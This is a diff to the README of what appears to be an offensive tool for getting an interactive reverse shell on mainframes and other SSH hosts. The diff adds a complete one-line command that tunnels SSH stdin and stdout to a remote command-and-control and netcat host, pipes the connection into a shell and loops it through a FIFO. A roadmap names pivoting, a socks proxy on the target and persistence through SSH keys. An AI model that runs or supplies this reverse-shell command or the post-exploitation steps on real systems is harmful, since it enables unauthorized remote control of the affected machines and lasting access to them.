@@ -12,12 +12,23 @@ The library contains:
  * `sshutils/ssh_utils.py` generation and management of ssh keys and fingerprinting
 
 The python files in the root of the project exhibit a lower coding quality than the others.
+
 ## Design
 This project uses the new ssh stdin and stout redirection to get a fully interactive reverse shell on a mainframe.
 
+Here is an example:
+
+```
+ssh -i $KEYNAME $CCU@$CCS -p $CCP -o UserKnownHostsFile=$KNOWNHOSTSFILE -o StrictHostKeyChecking=yes -N -W $NCIP:$NCP < $FIFONAME | sh -s > $FIFONAME 2>&1 & echo $STARTSEND > $FIFONAME'
+```
+
+SSH tunnels stdin and stdout, piping to a shell.
+A FIFO file contains all the inputs and outputs to and from the shell.
+Please note how awesome the strong host fingerprint checking and the key-based authentication are.
+
 The same principle can be applied to other systems running ssh.
 
-You have to do the cleanup by yourself, this is a design choice.
+You have to do the cleanup by yourself.
 
 Python >= 3.7 only.
 
@@ -65,14 +76,13 @@ bash testing/synch_shell.sh
 Enjoy your local shell.
 
 ## Future Steps
-* Client-side logging or verbosity
 * Update this readme
 * Automate running custom sshd server on the target to get full socks proxy (-R)
 * Automate the pivoting by parsing the output of netstat/NETSTAT and:
     - ssh -R
     - ssh -L
     - starting a local sshd
-* Automatic APF library enumeration
-* Persistence via ssh keys
+* Automatic APF library enumeration (?)
+* Persistence via ssh keys (?)
 * Port to other systems
 
